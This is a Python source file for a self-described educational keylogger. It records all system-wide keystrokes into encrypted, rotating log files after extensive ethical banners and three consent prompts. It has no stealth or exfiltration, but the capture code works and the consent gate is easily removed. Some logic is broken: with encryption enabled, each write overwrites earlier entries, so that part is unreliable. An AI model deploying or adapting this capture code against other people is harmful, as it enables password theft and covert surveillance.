"""
Enhanced Educational Keylogger Module
====================================

WARNING: This module is for EDUCATIONAL PURPOSES ONLY.
It demonstrates advanced keylogging concepts for learning about:
- Multi-threaded input monitoring
- File rotation and log management
- Advanced consent mechanisms
- Ethical programming practices
- System programming concepts

DO NOT use this code for malicious purposes or to monitor others without consent.
Always respect privacy and follow applicable laws.

Author: Educational Project
License: MIT
"""

import os
import sys
import time
import json
import logging
import threading
import tempfile
from datetime import datetime, timedelta
from pathlib import Path
from typing import Optional, Dict, Any, List
from collections import deque
import queue

try:
    from pynput import keyboard
    from pynput.keyboard import Key, KeyCode
    import psutil
    from cryptography.fernet import Fernet
    from colorama import init, Fore, Style, Back
except ImportError as e:
    print(f"Missing required dependency: {e}")
    print("Please install requirements: pip install -r requirements.txt")
    sys.exit(1)

# Initialize colorama for colored output
init(autoreset=True)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('keylogger.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


class EthicalConsentManager:
    """
    Manages ethical consent and warnings for the keylogger.
    Implements multiple layers of consent verification.
    """
    
    def __init__(self):
        self.consent_given = False
        self.consent_timestamp = None
        self.ethical_agreement = False
        self.usage_purpose_confirmed = False
    
    def display_comprehensive_warning(self):
        """Display comprehensive ethical warning with multiple sections."""
        self._display_header()
        self._display_ethical_warning()
        self._display_legal_notice()
        self._display_usage_restrictions()
        self._display_consent_requirements()
    
    def _display_header(self):
        """Display warning header."""
        print(f"\n{Back.RED}{Fore.WHITE}{'='*80}")
        print(f"{'='*20} CRITICAL ETHICAL WARNING {'='*20}")
        print(f"{'='*80}{Style.RESET_ALL}")
    
    def _display_ethical_warning(self):
        """Display ethical warning section."""
        warning = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════════════════╗
║                        ETHICAL WARNING - READ CAREFULLY                        ║
╠══════════════════════════════════════════════════════════════════════════╣
║                                                                          ║
║  ⚠️  This tool is for EDUCATIONAL PURPOSES ONLY!                        ║
║                                                                          ║
║  ⚠️  It demonstrates keylogging concepts for learning about:            ║
║     • System programming and input monitoring                           ║
║     • Multi-threaded application development                            ║
║     • File I/O operations and log management                            ║
║     • Ethical programming practices                                     ║
║                                                                          ║
║  ⚠️  DO NOT use this code for:                                          ║
║     • Monitoring others without explicit consent                        ║
║     • Stealing passwords or sensitive information                       ║
║     • Corporate espionage or unauthorized surveillance                  ║
║     • Violating privacy laws or regulations                            ║
║     • Any malicious or harmful activities                               ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(warning)
    
    def _display_legal_notice(self):
        """Display legal notice section."""
        legal = f"""
{Fore.YELLOW}╔══════════════════════════════════════════════════════════════════════════╗
║                           LEGAL NOTICE                                    ║
╠══════════════════════════════════════════════════════════════════════════╣
║                                                                          ║
║  📋  By using this tool, you acknowledge and agree to:                  ║
║                                                                          ║
║     • Use it only for legitimate educational purposes                   ║
║     • Obtain proper consent before monitoring any keystrokes            ║
║     • Comply with all applicable laws and regulations                   ║
║     • Respect privacy and ethical boundaries                            ║
║     • Not use this software for harmful purposes                        ║
║                                                                          ║
║  ⚖️  The authors are not responsible for misuse or illegal activities   ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(legal)
    
    def _display_usage_restrictions(self):
        """Display usage restrictions section."""
        restrictions = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════╗
║                        USAGE RESTRICTIONS                                 ║
╠══════════════════════════════════════════════════════════════════════════╣
║                                                                          ║
║  🚫  RESTRICTED USES:                                                   ║
║                                                                          ║
║     • Personal devices only (with your own consent)                     ║
║     • Educational research and learning                                  ║
║     • Academic study and programming practice                           ║
║     • Controlled laboratory environments                                 ║
║                                                                          ║
║  ✅  APPROVED USES:                                                     ║
║                                                                          ║
║     • Learning system programming concepts                               ║
║     • Understanding input monitoring mechanisms                          ║
║     • Studying cybersecurity and protection methods                      ║
║     • Academic research with proper oversight                           ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(restrictions)
    
    def _display_consent_requirements(self):
        """Display consent requirements section."""
        consent = f"""
{Fore.MAGENTA}╔══════════════════════════════════════════════════════════════════════════╗
║                        CONSENT REQUIREMENTS                              ║
╠══════════════════════════════════════════════════════════════════════════╣
║                                                                          ║
║  🔐  MULTIPLE CONSENT LEVELS REQUIRED:                                  ║
║                                                                          ║
║     1. Ethical understanding and agreement                              ║
║     2. Purpose confirmation for educational use                         ║
║     3. Final consent to proceed                                         ║
║                                                                          ║
║  ⚠️  The tool will NOT start without complete consent                    ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(consent)
    
    def get_ethical_agreement(self) -> bool:
        """Get user agreement to ethical guidelines."""
        print(f"\n{Fore.YELLOW}Do you understand and agree to the ethical guidelines above? (yes/no): {Style.RESET_ALL}")
        response = input().lower().strip()
        
        if response in ['yes', 'y']:
            self.ethical_agreement = True
            print(f"{Fore.GREEN}✓ Ethical agreement confirmed{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.RED}✗ Ethical agreement not given. Exiting.{Style.RESET_ALL}")
            return False
    
    def get_usage_purpose_confirmation(self) -> bool:
        """Get confirmation of educational usage purpose."""
        print(f"\n{Fore.YELLOW}Do you confirm this tool will be used ONLY for educational purposes? (yes/no): {Style.RESET_ALL}")
        response = input().lower().strip()
        
        if response in ['yes', 'y']:
            self.usage_purpose_confirmed = True
            print(f"{Fore.GREEN}✓ Educational purpose confirmed{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.RED}✗ Educational purpose not confirmed. Exiting.{Style.RESET_ALL}")
            return False
    
    def get_final_consent(self) -> bool:
        """Get final consent to proceed."""
        print(f"\n{Fore.YELLOW}Do you give final consent to proceed with the educational keylogger? (yes/no): {Style.RESET_ALL}")
        response = input().lower().strip()
        
        if response in ['yes', 'y']:
            self.consent_given = True
            self.consent_timestamp = datetime.now()
            print(f"{Fore.GREEN}✓ Final consent confirmed. Proceeding with educational demonstration.{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.RED}✗ Final consent not given. Exiting.{Style.RESET_ALL}")
            return False
    
    def verify_complete_consent(self) -> bool:
        """Verify all consent levels are met."""
        if not self.ethical_agreement:
            print(f"{Fore.RED}✗ Ethical agreement required{Style.RESET_ALL}")
            return False
        
        if not self.usage_purpose_confirmed:
            print(f"{Fore.RED}✗ Educational purpose confirmation required{Style.RESET_ALL}")
            return False
        
        if not self.consent_given:
            print(f"{Fore.RED}✗ Final consent required{Style.RESET_ALL}")
            return False
        
        return True


class LogFileManager:
    """
    Manages log file operations including rotation and maintenance.
    """
    
    def __init__(self, log_dir: str, max_file_size_mb: int = 10, max_files: int = 5):
        self.log_dir = Path(log_dir)
        self.log_dir.mkdir(exist_ok=True)
        self.max_file_size_mb = max_file_size_mb
        self.max_files = max_files
        self.current_log_file = None
        self.current_log_size = 0
        self.log_files = deque(maxlen=max_files)
        
        # Initialize logging
        self._setup_logging()
    
    def _setup_logging(self):
        """Setup logging configuration."""
        log_file = self.log_dir / "keylogger_operations.log"
        file_handler = logging.FileHandler(log_file)
        file_handler.setLevel(logging.INFO)
        
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        file_handler.setFormatter(formatter)
        
        logger.addHandler(file_handler)
    
    def get_current_log_file(self) -> Path:
        """Get the current log file path, creating new one if needed."""
        if self.current_log_file is None or self._should_rotate():
            self._rotate_log_file()
        
        return self.current_log_file
    
    def _should_rotate(self) -> bool:
        """Check if log file should be rotated."""
        if self.current_log_file is None:
            return True
        
        if not self.current_log_file.exists():
            return True
        
        # Check file size
        file_size_mb = self.current_log_file.stat().st_size / (1024 * 1024)
        if file_size_mb >= self.max_file_size_mb:
            return True
        
        return False
    
    def _rotate_log_file(self):
        """Rotate the log file."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        if self.current_log_file is not None:
            # Archive old file
            archive_name = f"keylog_archive_{timestamp}.json"
            archive_path = self.log_dir / archive_name
            
            try:
                if self.current_log_file.exists():
                    self.current_log_file.rename(archive_path)
                    self.log_files.append(archive_path)
                    logger.info(f"Log file rotated: {archive_path}")
            except Exception as e:
                logger.error(f"Error rotating log file: {e}")
        
        # Create new log file
        new_log_name = f"keylog_{timestamp}.json"
        self.current_log_file = self.log_dir / new_log_name
        
        # Initialize with empty array
        try:
            with open(self.current_log_file, 'w') as f:
                json.dump([], f)
            self.current_log_size = 0
            logger.info(f"New log file created: {self.current_log_file}")
        except Exception as e:
            logger.error(f"Error creating new log file: {e}")
    
    def cleanup_old_logs(self):
        """Clean up old log files beyond the maximum limit."""
        try:
            # Get all log files sorted by modification time
            all_logs = sorted(
                self.log_dir.glob("keylog_*.json"),
                key=lambda x: x.stat().st_mtime,
                reverse=True
            )
            
            # Keep only the most recent files
            for old_log in all_logs[self.max_files:]:
                try:
                    old_log.unlink()
                    logger.info(f"Cleaned up old log file: {old_log}")
                except Exception as e:
                    logger.error(f"Error cleaning up log file {old_log}: {e}")
        
        except Exception as e:
            logger.error(f"Error during log cleanup: {e}")


class EnhancedEducationalKeylogger:
    """
    Enhanced Educational Keylogger with advanced features.
    
    Features:
    - Multi-threaded operation
    - File rotation and management
    - Comprehensive consent mechanisms
    - Extensive ethical warnings
    - Graceful shutdown handling
    - Advanced error handling and logging
    """
    
    def __init__(self, 
                 log_dir: str = "logs",
                 max_file_size_mb: int = 10,
                 max_files: int = 5,
                 encrypt_logs: bool = True):
        """
        Initialize the enhanced educational keylogger.
        
        Args:
            log_dir: Directory to store log files
            max_file_size_mb: Maximum log file size in MB before rotation
            max_files: Maximum number of log files to keep
            encrypt_logs: Whether to encrypt log files
        """
        # Initialize components
        self.consent_manager = EthicalConsentManager()
        self.log_manager = LogFileManager(log_dir, max_file_size_mb, max_files)
        
        # Configuration
        self.encrypt_logs = encrypt_logs
        self.encryption_key = None
        self.fernet = None
        
        # State management
        self.is_running = False
        self.key_count = 0
        self.start_time = None
        self.shutdown_event = threading.Event()
        
        # Threading components
        self.keyboard_thread = None
        self.logging_thread = None
        self.key_queue = queue.Queue()
        
        # Statistics
        self.stats = {
            'keys_logged': 0,
            'files_rotated': 0,
            'errors_encountered': 0,
            'start_time': None,
            'session_duration': None
        }
        
        # Setup encryption if enabled
        if self.encrypt_logs:
            self._setup_encryption()
        
        # Display ethical warnings and get consent
        self._display_ethical_warnings()
        if not self._get_complete_consent():
            sys.exit(0)
    
    def _setup_encryption(self):
        """Setup encryption for log files."""
        try:
            key_file = self.log_manager.log_dir / "encryption.key"
            if key_file.exists():
                with open(key_file, "rb") as f:
                    self.encryption_key = f.read()
            else:
                self.encryption_key = Fernet.generate_key()
                with open(key_file, "wb") as f:
                    f.write(self.encryption_key)
            
            self.fernet = Fernet(self.encryption_key)
            logger.info("Encryption setup complete")
            print(f"{Fore.GREEN}✓ Encryption setup complete{Style.RESET_ALL}")
        except Exception as e:
            logger.error(f"Encryption setup failed: {e}")
            print(f"{Fore.RED}✗ Encryption setup failed: {e}{Style.RESET_ALL}")
            self.encrypt_logs = False
    
    def _display_ethical_warnings(self):
        """Display comprehensive ethical warnings."""
        self.consent_manager.display_comprehensive_warning()
    
    def _get_complete_consent(self) -> bool:
        """Get complete consent through all required levels."""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'='*20} CONSENT VERIFICATION PROCESS {'='*20}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        # Level 1: Ethical agreement
        if not self.consent_manager.get_ethical_agreement():
            return False
        
        # Level 2: Usage purpose confirmation
        if not self.consent_manager.get_usage_purpose_confirmation():
            return False
        
        # Level 3: Final consent
        if not self.consent_manager.get_final_consent():
            return False
        
        # Verify complete consent
        if not self.consent_manager.verify_complete_consent():
            return False
        
        print(f"\n{Fore.GREEN}{'='*80}")
        print(f"{'='*20} CONSENT VERIFICATION COMPLETE {'='*20}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        return True
    
    def _keyboard_listener_thread(self):
        """Thread function for keyboard monitoring."""
        try:
            with keyboard.Listener(
                on_press=self._on_key_press,
                on_release=self._on_key_release
            ) as listener:
                listener.join()
        except Exception as e:
            logger.error(f"Keyboard listener error: {e}")
            self.shutdown_event.set()
    
    def _logging_thread(self):
        """Thread function for processing logged keys."""
        while not self.shutdown_event.is_set():
            try:
                # Get key from queue with timeout
                try:
                    key_data = self.key_queue.get(timeout=1.0)
                except queue.Empty:
                    continue
                
                # Process and log the key
                self._process_key_log(key_data)
                
            except Exception as e:
                logger.error(f"Logging thread error: {e}")
                self.stats['errors_encountered'] += 1
    
    def _on_key_press(self, key):
        """Handle key press events."""
        try:
            # Convert key to string representation
            key_str = self._key_to_string(key)
            
            # Create log entry
            log_entry = {
                'timestamp': datetime.now().isoformat(),
                'event_type': 'press',
                'key': key_str,
                'key_code': str(key),
                'process': self._get_active_process()
            }
            
            # Add to queue for processing
            self.key_queue.put(log_entry)
            
            # Update statistics
            self.key_count += 1
            self.stats['keys_logged'] += 1
            
            # Display progress every 50 keys
            if self.key_count % 50 == 0:
                print(f"{Fore.CYAN}Keys logged: {self.key_count}{Style.RESET_ALL}")
                
        except Exception as e:
            logger.error(f"Error processing key press: {e}")
            self.stats['errors_encountered'] += 1
    
    def _on_key_release(self, key):
        """Handle key release events."""
        try:
            if key == Key.esc:
                print(f"{Fore.YELLOW}ESC key pressed. Initiating graceful shutdown...{Style.RESET_ALL}")
                self.shutdown_event.set()
                return False
        except Exception as e:
            logger.error(f"Error processing key release: {e}")
            self.stats['errors_encountered'] += 1
    
    def _key_to_string(self, key) -> str:
        """Convert key object to string representation."""
        try:
            if hasattr(key, 'char'):
                return key.char
            elif key == Key.space:
                return ' '
            elif key == Key.enter:
                return '\n'
            elif key == Key.backspace:
                return '[BACKSPACE]'
            elif key == Key.tab:
                return '[TAB]'
            elif key == Key.esc:
                return '[ESC]'
            elif key == Key.shift:
                return '[SHIFT]'
            elif key == Key.ctrl:
                return '[CTRL]'
            elif key == Key.alt:
                return '[ALT]'
            else:
                return str(key)
        except Exception as e:
            logger.error(f"Error converting key to string: {e}")
            return str(key)
    
    def _process_key_log(self, key_data: Dict[str, Any]):
        """Process and log key data."""
        try:
            # Get current log file
            log_file = self.log_manager.get_current_log_file()
            
            # Read existing logs
            logs = []
            if log_file.exists():
                try:
                    with open(log_file, 'r', encoding='utf-8') as f:
                        logs = json.load(f)
                except (json.JSONDecodeError, UnicodeDecodeError):
                    logs = []
            
            # Add new log entry
            logs.append(key_data)
            
            # Write logs (encrypted if enabled)
            if self.encrypt_logs and self.fernet:
                encrypted_data = self.fernet.encrypt(
                    json.dumps(logs, ensure_ascii=False).encode()
                )
                with open(log_file, 'wb') as f:
                    f.write(encrypted_data)
            else:
                with open(log_file, 'w', encoding='utf-8') as f:
                    json.dump(logs, f, ensure_ascii=False, indent=2)
            
            # Update file size tracking
            self.log_manager.current_log_size = log_file.stat().st_size
            
        except Exception as e:
            logger.error(f"Error processing key log: {e}")
            self.stats['errors_encountered'] += 1
    
    def _get_active_process(self) -> str:
        """Get the currently active process name."""
        try:
            # This is a simplified approach for educational purposes
            # In a real scenario, you'd need more sophisticated process detection
            return "Educational Demo"
        except Exception:
            return "Unknown"
    
    def start(self):
        """Start the enhanced keylogger."""
        if self.is_running:
            print(f"{Fore.YELLOW}Keylogger is already running.{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.GREEN}Starting Enhanced Educational Keylogger...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Press ESC to stop{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Logs will be saved to: {self.log_manager.log_dir}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}File rotation: {self.log_manager.max_file_size_mb}MB max, {self.log_manager.max_files} files{Style.RESET_ALL}")
        
        # Set running state
        self.is_running = True
        self.start_time = datetime.now()
        self.stats['start_time'] = self.start_time.isoformat()
        
        # Start keyboard listener thread
        self.keyboard_thread = threading.Thread(
            target=self._keyboard_listener_thread,
            daemon=True
        )
        self.keyboard_thread.start()
        
        # Start logging thread
        self.logging_thread = threading.Thread(
            target=self._logging_thread,
            daemon=True
        )
        self.logging_thread.start()
        
        logger.info("Enhanced keylogger started")
        print(f"{Fore.GREEN}✓ Enhanced keylogger started successfully{Style.RESET_ALL}")
        
        # Wait for shutdown signal
        try:
            while not self.shutdown_event.is_set():
                time.sleep(0.1)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Interrupted by user{Style.RESET_ALL}")
            self.shutdown_event.set()
        
        # Stop the keylogger
        self.stop()
    
    def stop(self):
        """Stop the keylogger and perform cleanup."""
        if not self.is_running:
            return
        
        print(f"\n{Fore.YELLOW}Stopping enhanced keylogger...{Style.RESET_ALL}")
        
        # Set shutdown event
        self.shutdown_event.set()
        
        # Wait for threads to finish
        if self.keyboard_thread and self.keyboard_thread.is_alive():
            self.keyboard_thread.join(timeout=2.0)
        
        if self.logging_thread and self.logging_thread.is_alive():
            self.logging_thread.join(timeout=2.0)
        
        # Update statistics
        self.is_running = False
        if self.start_time:
            duration = datetime.now() - self.start_time
            self.stats['session_duration'] = str(duration).split('.')[0]
        
        # Cleanup old logs
        self.log_manager.cleanup_old_logs()
        
        # Display session summary
        self._display_session_summary()
        
        logger.info("Enhanced keylogger stopped")
    
    def _display_session_summary(self):
        """Display comprehensive session summary."""
        print(f"\n{Fore.GREEN}╔══════════════════════════════════════════════════════════════╗")
        print(f"║                    ENHANCED SESSION SUMMARY                    ║")
        print(f"╠══════════════════════════════════════════════════════════════╣")
        print(f"║  Total keys logged: {self.key_count:>35} ║")
        if self.stats['session_duration']:
            print(f"║  Session duration: {self.stats['session_duration']:>35} ║")
        print(f"║  Log directory: {str(self.log_manager.log_dir):>35} ║")
        print(f"║  Encryption: {'Enabled' if self.encrypt_logs else 'Disabled':>35} ║")
        print(f"║  Files rotated: {self.stats['files_rotated']:>35} ║")
        print(f"║  Errors encountered: {self.stats['errors_encountered']:>35} ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Remember: This tool is for educational purposes only!{Style.RESET_ALL}")
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get comprehensive statistics about the keylogger session."""
        return {
            'is_running': self.is_running,
            'key_count': self.key_count,
            'start_time': self.stats['start_time'],
            'session_duration': self.stats['session_duration'],
            'log_directory': str(self.log_manager.log_dir),
            'encryption_enabled': self.encrypt_logs,
            'files_rotated': self.stats['files_rotated'],
            'errors_encountered': self.stats['errors_encountered'],
            'consent_timestamp': self.consent_manager.consent_timestamp.isoformat() if self.consent_manager.consent_timestamp else None
        }


def main():
    """Main function to demonstrate the enhanced educational keylogger."""
    print(f"{Fore.CYAN}Enhanced Educational Keylogger Demo")
    print(f"{Fore.CYAN}===================================={Style.RESET_ALL}")
    
    # Create and start the enhanced keylogger
    keylogger = EnhancedEducationalKeylogger(
        log_dir="enhanced_logs",
        max_file_size_mb=5,  # 5MB file size limit
        max_files=3,         # Keep 3 log files
        encrypt_logs=True
    )
    
    try:
        keylogger.start()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        print(f"\n{Fore.RED}Unexpected error: {e}{Style.RESET_ALL}")
    finally:
        keylogger.stop()


if __name__ == "__main__":
    main()
